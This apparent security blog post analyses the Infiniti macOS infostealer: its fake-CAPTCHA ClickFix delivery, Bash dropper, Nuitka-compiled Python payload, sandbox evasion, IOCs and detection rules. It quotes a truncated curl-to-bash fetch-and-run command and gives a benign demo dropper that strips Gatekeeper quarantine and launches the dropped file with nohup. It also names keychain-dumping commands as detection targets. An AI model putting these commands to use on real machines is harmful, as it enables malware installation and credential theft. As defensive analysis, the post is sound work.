---
layout: post
title: "Infiniti Stealer: ClickFix Meets a Nuitka-Compiled Python Stealer on macOS"
date: 2026-06-01
categories: [malware, analysis]
tags: [infiniti-stealer, nukechain, clickfix, macos, stealer, nuitka, mitre-attack]
excerpt: "A macOS stealer that ships its Python payload as a native Mach-O binary, delivered through a fake Cloudflare CAPTCHA that asks you to paste a command into Terminal yourself."
---

## What showed up

I have written about macOS ClickFix before. The SHub/MacSync family, the AppleScript pivot after Apple killed the Terminal-paste trick in Tahoe. So when I saw Malwarebytes document a stealer they first tracked as NukeChain, then renamed Infiniti once the operator panel leaked its own name, I almost filed it under "more of the same." Then I read how it ships the payload, and it stopped being boring.

This is, as far as anyone has documented, the first macOS campaign that pairs ClickFix delivery with a Python stealer compiled by Nuitka into a native binary. Not PyInstaller. Nuitka. That difference is the whole story, and I will get to why it matters.

The infection starts at `update-check[.]com`, a near-perfect clone of a Cloudflare human-verification page. The final stealer, `UpdateHelper.bin`, is a Python 3.11 payload compiled to an Apple Silicon Mach-O.

SHA256 (Stage 3): `1e63be724bf651bb17bcf181d11bacfabef6a6360dcdfda945d6389e80f2b958`
C2 panel: `Infiniti-stealer[.]com`

Apple's built-in XProtect did not flag the early samples, which is the usual reason these families stay alive. The Malwarebytes writeup by Stefan Dasic is the primary source here, with binary analysis credited to Marcelo Rivero.

## What makes it work

The delivery half is pure social engineering. ClickFix does not exploit a bug. It exploits you. MITRE tracks it as T1204.004, Malicious Copy and Paste, added to ATT&CK in March 2025 once this stopped being a curiosity and became a wave.

The fake CAPTCHA tells the visitor to press Command + Space, open Terminal, and paste a "verification" command. That command is deliberately ugly so nobody reads it:

```
bash <(curl -sSfL $(echo aHR0cHM6...d5 | base64 --decode))
```

The base64 blob decodes to a URL on the same domain. `curl` pulls a first-stage Bash script, and `bash <(...)` runs it straight from the process substitution without ever writing the dropper to disk. Because you typed it, there was no malicious download, no attachment, no exploit. Gatekeeper has nothing to inspect. This is T1059.004, Unix shell execution, kicked off by your own hands.

Stage 1 is a Bash dropper built from a template seen in earlier MacSync/SHub samples, which points at a shared builder being sold or reused. Its job list is short and effective. Decode an embedded payload, write the Stage-2 binary into `/tmp`, strip the quarantine flag with `xattr -dr com.apple.quarantine`, then launch the binary with `nohup` while passing the C2 address and an auth token as environment variables. After that it deletes itself and closes Terminal with an AppleScript call so the victim sees nothing linger. That quarantine removal is the quiet part. It is MITRE T1553.001, Gatekeeper Bypass, and it is the line that defenders should care about most, because legitimate software almost never strips its own quarantine attribute.

Stage 2 is where it gets interesting. The dropped Mach-O is about 8.6 MB, built with Nuitka in onefile mode. Its header carries the signature bytes `4b 41 59 28 b5 2f fd`, which read as `KAY (` followed by a zstd magic number. Nuitka packs the application as a zstd-compressed archive behind that marker. Here is why I care: PyInstaller bundles your `.pyc` files and an interpreter, so an analyst can carve them out and decompile in minutes. Nuitka actually compiles Python into C and then into a native binary. There are no neat `.pyc` files to lift. Static analysis turns into reading compiled C with Python's object model smeared all over it. At runtime the loader inflates roughly 35 MB of embedded data and runs the real payload. It is more work to build and far more annoying to take apart, and that tradeoff is exactly what a stealer-as-a-service operator wants.

Stage 3 is the Python 3.11 stealer itself. Even compiled, it leaks thousands of named symbols, so the module layout can be partly rebuilt, which is the one mercy here. What it takes is the standard infostealer shopping list, executed thoroughly. Credentials from Chromium browsers and Firefox (T1555.003). macOS Keychain entries (T1555.001). Cryptocurrency wallets. Plaintext secrets sitting in developer files like `.env`, which is a pointed choice given how many engineers keep live API keys there. It grabs screenshots during execution (T1113) and ships everything out over HTTP POST (T1071.001).

Before it steals anything it checks where it is running. It looks for any.run, Joe Sandbox, Hybrid Analysis, VMware, and VirtualBox, and it adds a randomized execution delay to outlast automated sandboxes that only watch a sample for a minute or two. That is T1497, virtualization and sandbox evasion. When exfiltration finishes, a function named `upload_complete()` fires a Telegram notification to the operator and queues the stolen credentials for server-side password cracking. The operators are not just collecting. They are running a pipeline.

So how clever is this, really? The ClickFix front end is commodity. We have seen it for two years. The Nuitka backend is the part worth respecting, in the way you respect a competent burglar. It is not novel computer science. It is a smart packaging decision that buys real time against analysts and AV. Lazy malware reuses a builder and calls it a day. This one reused a builder and then made the payload genuinely harder to read. That is a step up.

## Local educational sample

Here is the delivery technique, the quarantine-removal trick specifically, with the payload replaced by something harmless. Reading this teaches you the shape of the dropper without handing anyone a weapon.

```bash
#!/usr/bin/env bash
# EDUCATIONAL SAMPLE - demonstrates the macOS quarantine-removal dropper pattern
# This does NOT contain any malicious payload
# For research and defensive awareness only

# Real droppers decode an embedded blob here. We write a benign script instead.
STAGE2="/tmp/.demo_helper"
cat > "$STAGE2" <<'EOF'
#!/bin/bash
echo "If this were malware, Stage 2 would run now."
open -a TextEdit   # benign stand-in for the real payload
EOF
chmod +x "$STAGE2"

# THE TECHNIQUE TO WATCH:
# Stripping com.apple.quarantine so Gatekeeper never prompts on the dropped file.
# Legitimate installers do not do this to their own files.
xattr -dr com.apple.quarantine "$STAGE2"   # MITRE T1553.001 - Gatekeeper bypass

# Launch detached, the way the real dropper uses nohup to survive Terminal closing.
nohup "$STAGE2" >/dev/null 2>&1 &

# Real samples self-delete and close Terminal via AppleScript to hide the trail.
# rm -- "$0"   # left commented so this demo stays inspectable
```

Two lines carry the lesson. The `xattr -dr com.apple.quarantine` call is the defensive tripwire, and `nohup ... &` is how the payload outlives the Terminal window the victim is about to close.

## Detection and defense

You catch this with process telemetry, not file scanning, because the early stages never sit still on disk long enough. Apple's Endpoint Security Framework is the right source. Wire ESF process-creation events into your EDR or a Sysmon-for-macOS deployment and alert on a few specific patterns.

Watch for `xattr` invoked with `-d` or `-dr` and `com.apple.quarantine` by any process that is not a known installer. Elastic ships a rule for exactly this, "Quarantine Attrib Removed by Unsigned or Untrusted Process," and it is a high-signal detection. Watch for `bash` or `zsh` spawned with a `curl` process substitution as a parent chain, which is the ClickFix paste fingerprint. Watch the `security` binary being called with `dump-keychain`, `find-generic-password`, or `export-keychain`, the classic Keychain harvest (T1555.001). And flag any fresh executable spawned out of `/tmp` under `nohup`.

On the file side, the IOCs are concrete. The dropper drops a debug log at `/tmp/.bs_debug.log` and stages the binary under `/tmp/.2835b1b5098587a9` with a random suffix. Hunt those. For YARA, the Nuitka onefile marker is a clean anchor: the byte sequence `4b 41 59 28 b5 2f fd`, the `KAY (` plus zstd magic, in a Mach-O. That will not catch every Nuitka binary as malicious, but combined with a small file size and an origin in `/tmp` it is a strong hunt. Also sweep `~/Library/LaunchAgents/` for persistence that does not belong.

Mitigations are mostly about the human in the loop. No legitimate CAPTCHA has ever asked anyone to open Terminal and paste a command. Say that to your users until they are sick of hearing it. For fleets, restrict who can run `xattr` and `curl | bash` patterns where you can, keep XProtect and the OS current so the platform-level ClickFix mitigations from Tahoe stay in force, and treat any developer machine with loose `.env` hygiene as a credential-leak waiting to happen. The fix for the Terminal-paste vector exists at the OS level now. The fix for the people pasting commands is education, and that one never fully ships.

Sample reference (do not download): [https://www.malwarebytes.com/blog/threat-intel/2026/03/infiniti-stealer-a-new-macos-infostealer-using-clickfix-and-python-nuitka](https://www.malwarebytes.com/blog/threat-intel/2026/03/infiniti-stealer-a-new-macos-infostealer-using-clickfix-and-python-nuitka)
